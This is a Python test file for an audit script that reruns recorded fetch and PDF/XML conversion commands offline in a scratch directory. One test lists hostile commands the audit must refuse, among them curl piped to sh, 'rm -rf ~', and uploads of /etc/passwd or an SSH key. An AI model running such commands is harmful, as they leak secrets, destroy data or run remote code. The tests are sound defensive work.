"""The source reproducibility audit reruns an account's recorded fetch and conversion commands in a scratch directory,
offline here: a fake runner plays curl and pdftotext. Only plain fetch and convert commands are ever run."""
import hashlib
import importlib.util
import io
import json
import sys
import urllib.error

import pytest

from reveal_backend.runtime_config import ROOT

spec = importlib.util.spec_from_file_location('audit_account_sources', ROOT / 'scripts/audit_account_sources.py')
audit = importlib.util.module_from_spec(spec); spec.loader.exec_module(audit)

XML_URL = 'https://www.ebi.ac.uk/europepmc/webservices/rest/PMC3491803/fullTextXML'
PDF_URL = 'https://example.org/papers/lepr.pdf'
UPSTREAM = {XML_URL: b'<article><p>Hepatocyte LEPR loss reduces AKT phosphorylation.</p></article>', PDF_URL: b'%PDF-1.7 lepr'}


def sha(data):
    return hashlib.sha256(data).hexdigest()


def convert(data, version='22.12.0'):
    return b'text of ' + data + (b'' if version == '22.12.0' else b' (' + version.encode() + b')')


def papers(**commands):
    """The account's papers block as the job result gives it, sorted by path: the conversion comes before its PDF."""
    rows = [{'path': 'sources/PMC3491803.xml', 'url': XML_URL, 'sha256': sha(UPSTREAM[XML_URL]), 'size_bytes': len(UPSTREAM[XML_URL]),
             'media_type': 'application/xml', 'command': f'curl -sSL -o output/sources/PMC3491803.xml {XML_URL}',
             'observed_command': f'mkdir -p output/sources && curl -sSL -o output/sources/PMC3491803.xml {XML_URL}',
             'derived_from': None, 'evidence_items': 2, 'file_id': 'dapper:File.a'},
            {'path': 'sources/lepr-text.txt', 'url': PDF_URL, 'sha256': sha(convert(UPSTREAM[PDF_URL])), 'size_bytes': 30,
             'media_type': 'text/plain', 'command': 'pdftotext -layout /reveal/trusted/output/sources/lepr.pdf output/sources/lepr-text.txt',
             'observed_command': '…', 'derived_from': 'sources/lepr.pdf', 'evidence_items': 3, 'file_id': 'dapper:File.b'},
            {'path': 'sources/lepr.pdf', 'url': PDF_URL, 'sha256': sha(UPSTREAM[PDF_URL]), 'size_bytes': 13, 'media_type': 'application/pdf',
             'command': f'curl -fsSLo/reveal/output/sources/lepr.pdf {PDF_URL}', 'observed_command': '…', 'derived_from': None,
             'evidence_items': 0, 'file_id': 'dapper:File.c'}]
    for row in rows:
        row['command'] = commands.get(row['path'], row['command'])
    return sorted(rows, key=lambda row: row['path'])


class Runner:
    """Plays curl and pdftotext from the rewritten argument vector: what reached it, and in which order."""
    def __init__(self, upstream=UPSTREAM, version='22.12.0', exits=None):
        self.upstream, self.version, self.exits, self.calls = dict(upstream), version, exits or {}, []

    def __call__(self, invocation):
        self.calls.append(invocation)
        program, scratch = invocation.argv[0], str(invocation.cwd)
        paths = [word.split('=', 1)[-1] if word.startswith('--') else word for word in invocation.argv[1:]]
        paths = [word[word.index(scratch):] if scratch in word else word for word in paths]
        files = [word for word in paths if word.startswith(scratch)]
        if program in ('curl', 'wget'):
            url = next(word for word in paths if word.startswith('https://'))
            if url in self.exits:
                return self.exits[url]
            data = self.upstream[url]
            target = invocation.stdout[0] if invocation.stdout else files[-1]
        else:
            data = convert(open(files[0], 'rb').read(), self.version)
            target = invocation.stdout[0] if invocation.stdout else files[1]
        with open(target, 'wb') as handle:
            handle.write(data)
        return 0


def statuses(results):
    return {result.path: result.status for result in results}


def test_every_recorded_command_is_rerun_in_the_scratch_directory_fetches_first(tmp_path):
    runner = Runner()
    results = audit.audit(papers(), tmp_path, runner=runner)
    assert statuses(results) == dict.fromkeys(('sources/PMC3491803.xml', 'sources/lepr.pdf', 'sources/lepr-text.txt'), 'reproduced')
    # The conversion is listed before its PDF and runs after it.
    assert [call.argv[0] for call in runner.calls] == ['curl', 'curl', 'pdftotext']
    assert [result.path for result in results][-1] == 'sources/lepr-text.txt'
    for call in runner.calls:
        assert call.cwd == tmp_path and call.env['HOME'] == str(tmp_path) and set(call.env) <= {'PATH', 'HOME', *audit.NETWORK_ENVIRONMENT}
        assert not any('/reveal/' in word or word.startswith(('output/', './output/')) for word in call.argv), call.argv
    assert runner.calls[1].argv == ['curl', '-fsSLo' + str(tmp_path / 'output/sources/lepr.pdf'), PDF_URL]
    assert runner.calls[2].argv == ['pdftotext', '-layout', str(tmp_path / 'output/sources/lepr.pdf'), str(tmp_path / 'output/sources/lepr-text.txt')]
    assert results[0].sha256 == sha(UPSTREAM[XML_URL]) and results[0].size_bytes == len(UPSTREAM[XML_URL]) and results[0].exit_status == 0


def test_a_changed_upstream_copy_is_reported_and_is_not_a_failure(tmp_path, capsys):
    runner = Runner({**UPSTREAM, PDF_URL: b'%PDF-1.7 lepr, corrected'})
    results = audit.audit(papers(), tmp_path / 'a', runner=runner)
    assert statuses(results) == {'sources/PMC3491803.xml': 'reproduced', 'sources/lepr.pdf': 'changed_upstream',
                                 'sources/lepr-text.txt': 'changed_upstream'}
    assert results[-1].note == 'converted from a file that changed upstream' and not results[-1].used_original_input
    # With the bytes the job saved, the conversion is checked against the same input.
    kept = {sha(UPSTREAM[PDF_URL]): UPSTREAM[PDF_URL]}
    results = audit.audit(papers(), tmp_path / 'b', runner=Runner({**UPSTREAM, PDF_URL: b'new'}), original=kept.get)
    assert statuses(results)['sources/lepr-text.txt'] == 'reproduced' and results[-1].used_original_input
    # Bytes that do not match what was recorded are never used.
    results = audit.audit(papers(), tmp_path / 'c', runner=Runner({**UPSTREAM, PDF_URL: b'new'}), original=lambda digest: b'forged')
    assert statuses(results)['sources/lepr-text.txt'] == 'changed_upstream'
    source = tmp_path / 'result.json'
    source.write_text(json.dumps({'id': 'job', 'result': {'account': {'papers': papers()}}}))
    assert audit.main(['--result', str(source)], runner=Runner({**UPSTREAM, PDF_URL: b'new'})) == 0
    assert '1 reproduced · 2 changed upstream · 0 converter differs · 0 failed · 0 refused' in capsys.readouterr().out


def test_a_conversion_that_reads_the_same_bytes_and_writes_others_names_the_converter(tmp_path):
    results = audit.audit(papers(), tmp_path, runner=Runner(version='24.02.0'))
    assert statuses(results)['sources/lepr-text.txt'] == 'converter_differs'
    assert 'not the version the Box ran' in results[-1].note


def test_a_failed_fetch_reports_its_exit_status_and_its_conversion_cannot_run(tmp_path, capsys):
    runner = Runner(exits={PDF_URL: 22})
    results = audit.audit(papers(), tmp_path / 'a', runner=runner)
    pdf, text = (next(result for result in results if result.path == path) for path in ('sources/lepr.pdf', 'sources/lepr-text.txt'))
    assert (pdf.status, pdf.exit_status, pdf.note, pdf.sha256) == ('failed', 22, 'exited with status 22', None)
    assert text.status == 'failed' and 'could not be fetched' in text.note and len(runner.calls) == 2
    # With the original PDF the conversion still runs.
    results = audit.audit(papers(), tmp_path / 'b', runner=Runner(exits={PDF_URL: 22}), original={sha(UPSTREAM[PDF_URL]): UPSTREAM[PDF_URL]}.get)
    assert statuses(results)['sources/lepr-text.txt'] == 'reproduced'
    # A command that exits 0 without writing the file fails too; a timed-out one has no exit status.
    results = audit.audit(papers(), tmp_path / 'c', runner=lambda invocation: 0)
    assert {result.status for result in results} == {'failed'} and results[0].note == 'it wrote no file at output/sources/PMC3491803.xml'
    results = audit.audit(papers()[:1], tmp_path / 'd', runner=lambda invocation: None)
    assert (results[0].status, results[0].exit_status, results[0].note) == ('failed', None, 'timed out or could not start')
    source = tmp_path / 'result.json'; source.write_text(json.dumps({'papers': papers()}))
    assert audit.main(['--result', str(source), '--json'], runner=Runner(exits={PDF_URL: 22})) == 1
    report = json.loads(capsys.readouterr().out)
    assert report['counts'] == {'reproduced': 1, 'changed_upstream': 0, 'converter_differs': 0, 'failed': 2, 'refused': 0}
    assert {row['path']: row['exit_status'] for row in report['sources']}['sources/lepr.pdf'] == 22


@pytest.mark.parametrize('command', [
    'X=1 curl -o output/sources/a.xml https://x.org/a',                       # the first word is not the program
    'bash -c "curl -o output/sources/a.xml https://x.org/a"',
    'curl -o output/sources/a.xml https://x.org/a | sh',
    'curl -o output/sources/a.xml https://x.org/a && rm -rf ~',
    'curl -o output/sources/a.xml -d @/etc/passwd https://x.org/a',           # sends a local file
    'curl -sSLd x -o output/sources/a.xml https://x.org/a',
    'curl -T /etc/hosts -o output/sources/a.xml https://x.org/a',
    'curl -o output/sources/a.xml -F f=@/etc/hosts https://x.org/a',
    'curl -H @/etc/headers -o output/sources/a.xml https://x.org/a',
    'curl -o output/sources/a.xml file:///etc/passwd',                        # not http(s)
    'curl -o output/sources/a.xml --url=file:///etc/passwd',
    'curl -o output/sources/a.xml ftp://x.org/a',
    'curl --cacert ~/.ssh/id_rsa -o output/sources/a.xml https://x.org/a',     # a local file outside output/
    'pdftotext /etc/passwd output/sources/a.xml',
    'pdftotext ../secret.pdf output/sources/a.xml',
    'curl -o output/sources/../../a.xml https://x.org/a',
    'curl -o /tmp/a.xml https://x.org/a',
    'curl -s https://x.org/a > /tmp/a.xml',
    'xmllint --format output/sources/a.xml 1>&2',
    'wget --post-data=x -O output/sources/a.xml https://x.org/a',
    'python3 -c "print(1)" > output/sources/a.xml',
    '',
    # Any option not on the program's short list: variables and queries read from files, wget's abbreviated --execute,
    # xmllint's single-dash spellings and entity or DTD loading.
    'curl -o output/sources/a.xml --variable x@/etc/passwd --expand-url "https://x.org/?q={{x}}"',
    'curl -o output/sources/a.xml --url-query x@/etc/passwd https://x.org/a',
    'curl -K output/sources/config -o output/sources/a.xml https://x.org/a',
    'wget --exec post_file=/etc/passwd -O output/sources/a.xml https://x.org/a',
    'xmllint -dtdvalid http://x.org/e.dtd output/sources/a.xml',
    'xmllint --noent --loaddtd output/sources/a.xml > output/sources/b.xml',
    'xmllint --xinclude output/sources/a.xml > output/sources/b.xml',
    'curl -s -o output/sources/a.xml https://x.org/a -m',                      # an option without its value
    'curl --silent=yes -o output/sources/a.xml https://x.org/a',
])
def test_only_plain_fetch_and_convert_commands_are_run(tmp_path, command):
    row = {**papers()[0], 'path': 'sources/a.xml', 'command': command}
    calls = []
    results = audit.audit([row], tmp_path, runner=calls.append)
    assert results[0].status == 'refused' and results[0].note and calls == []
    with pytest.raises(audit.Refused):
        audit.plan(command, tmp_path)


def test_a_path_outside_sources_is_refused_and_the_cli_exits_one(tmp_path, capsys):
    row = {**papers()[0], 'path': '../account-1.json'}
    calls = []
    assert statuses(audit.audit([row], tmp_path, runner=calls.append)) == {'../account-1.json': 'refused'} and calls == []
    source = tmp_path / 'r.json'; source.write_text(json.dumps({'account': {'papers': [row]}}))
    assert audit.main(['--result', str(source)], runner=calls.append) == 1 and calls == []
    assert 'refused' in capsys.readouterr().out


@pytest.mark.parametrize('command, argv, stdout, stderr', [
    ('curl -sSL -o output/sources/a.xml https://x.org/a', ['curl', '-sSL', '-o', '{s}/output/sources/a.xml', 'https://x.org/a'], None, None),
    ('curl -sSL -o ./output/sources/a.xml https://x.org/a', ['curl', '-sSL', '-o', '{s}/output/sources/a.xml', 'https://x.org/a'], None, None),
    ('curl -fsSLo/reveal/output/sources/a.xml https://x.org/output/a', ['curl', '-fsSLo{s}/output/sources/a.xml', 'https://x.org/output/a'], None, None),
    ('curl --output=/reveal/trusted/output/sources/a.xml -H "Accept: application/xml" -A Mozilla/5.0 https://x.org/a',
     ['curl', '--output={s}/output/sources/a.xml', '-H', 'Accept: application/xml', '-A', 'Mozilla/5.0', 'https://x.org/a'], None, None),
    ('wget -q -O /reveal/output/sources/a.xml https://x.org/a', ['wget', '-q', '-O', '{s}/output/sources/a.xml', 'https://x.org/a'], None, None),
    ('wget -nv -qO output/sources/a.xml https://x.org/a', ['wget', '-nv', '-qO', '{s}/output/sources/a.xml', 'https://x.org/a'], None, None),
    ('curl -fsSL --retry 3 -m 60 -H @x -o output/sources/a.xml https://x.org/a', None, None, None),
    ('pdftotext -layout -enc UTF-8 -f 1 -l 3 output/sources/a.pdf output/sources/a.txt',
     ['pdftotext', '-layout', '-enc', 'UTF-8', '-f', '1', '-l', '3', '{s}/output/sources/a.pdf', '{s}/output/sources/a.txt'], None, None),
    ('pdftotext -layout output/sources/a.pdf - > output/sources/a.txt 2>/dev/null',
     ['pdftotext', '-layout', '{s}/output/sources/a.pdf', '-'], ('{s}/output/sources/a.txt', 'w'), None),
    ('xmllint --xpath "//body" output/sources/a.xml >> output/sources/a.txt 2>&1',
     ['xmllint', '--xpath', '//body', '{s}/output/sources/a.xml'], ('{s}/output/sources/a.txt', 'a'), 'stdout'),
    ('xmllint --format output/sources/a.xml 2>&1 > output/sources/b.xml',
     ['xmllint', '--format', '{s}/output/sources/a.xml'], ('{s}/output/sources/b.xml', 'w'), None),
    ('curl -s https://x.org/a &> output/sources/a.xml', ['curl', '-s', 'https://x.org/a'], ('{s}/output/sources/a.xml', 'w'), 'stdout'),
])
def test_every_output_path_form_and_redirect_lands_in_the_scratch_directory(tmp_path, command, argv, stdout, stderr):
    if argv is None:   # a value that is a local file, however the option is spelled
        with pytest.raises(audit.Refused, match='reads a local file'): audit.plan(command, tmp_path)
        return
    invocation = audit.plan(command, tmp_path)
    assert invocation.argv == [word.replace('{s}', str(tmp_path)) for word in argv]
    assert invocation.stdout == (None if stdout is None else (tmp_path / stdout[0].replace('{s}/', ''), stdout[1]))
    assert invocation.stderr == stderr and invocation.stdin is None and invocation.cwd == tmp_path


def test_run_applies_the_redirects_without_a_shell(tmp_path):
    out = tmp_path / 'out.txt'
    script = 'import sys; sys.stdout.write("to stdout; "); sys.stdout.flush(); sys.stderr.write("to stderr")'
    code = audit.run(audit.Invocation([sys.executable, '-c', script], tmp_path, {'HOME': str(tmp_path)}, stdout=(out, 'w'), stderr='stdout'))
    assert code == 0 and out.read_text() == 'to stdout; to stderr'
    assert audit.run(audit.Invocation([sys.executable, '-c', 'raise SystemExit(7)'], tmp_path, {})) == 7
    assert audit.run(audit.Invocation([sys.executable, '-c', 'import time; time.sleep(5)'], tmp_path, {}, timeout=0.2)) is None
    assert audit.run(audit.Invocation(['no-such-program-here'], tmp_path, {'PATH': str(tmp_path)})) is None


def test_the_sources_come_from_any_export_or_the_owner_route(tmp_path, capsys):
    rows = papers()
    for value in ({'papers': rows}, {'job_id': 'j', 'account': {'papers': rows}, 'document': {}}, {'result': {'account': {'papers': rows}}}):
        assert audit.papers_of(value) == rows
    with pytest.raises(ValueError): audit.papers_of({'result': {'response': 'no account'}})
    missing = tmp_path / 'missing.json'
    assert audit.main(['--result', str(missing)], runner=Runner()) == 2
    (tmp_path / 'answer.json').write_text('{"result": {"response": "x"}}')
    assert audit.main(['--result', str(tmp_path / 'answer.json')], runner=Runner()) == 2

    class Owner:
        def papers(self, job_id):
            assert job_id == 'job-1'; return papers()
        def original(self, job_id):
            return {sha(UPSTREAM[PDF_URL]): UPSTREAM[PDF_URL]}.get
    capsys.readouterr()
    assert audit.main(['--job', 'job-1', '--json'], runner=Runner({**UPSTREAM, PDF_URL: b'new'}), client=Owner()) == 0
    report = json.loads(capsys.readouterr().out)
    assert {row['path']: row['status'] for row in report['sources']}['sources/lepr-text.txt'] == 'reproduced'
    assert report['scratch'] is None


def test_the_owner_route_follows_a_storage_redirect_without_the_api_key():
    sent = []

    class Opener:
        def open(self, request, timeout):
            sent.append(request)
            if len(sent) == 1:
                raise urllib.error.HTTPError(request.full_url, 307, 'redirect', {'Location': 'https://storage.example.org/obj?sig=1'}, None)
            return io.BytesIO(b'raw bytes')
    client = audit.Client('https://reveal.example.org/', 'reveal-key', opener=Opener())
    digest = 'a' * 64
    assert client.original('job-1')(digest) == b'raw bytes'
    assert sent[0].full_url == f'https://reveal.example.org/v1/jobs/job-1/account/sources/{digest}'
    assert sent[0].get_header('Authorization') == 'Bearer reveal-key'
    assert sent[1].full_url == 'https://storage.example.org/obj?sig=1' and sent[1].get_header('Authorization') is None
    assert client.original('job-1')('../../etc') is None and len(sent) == 2
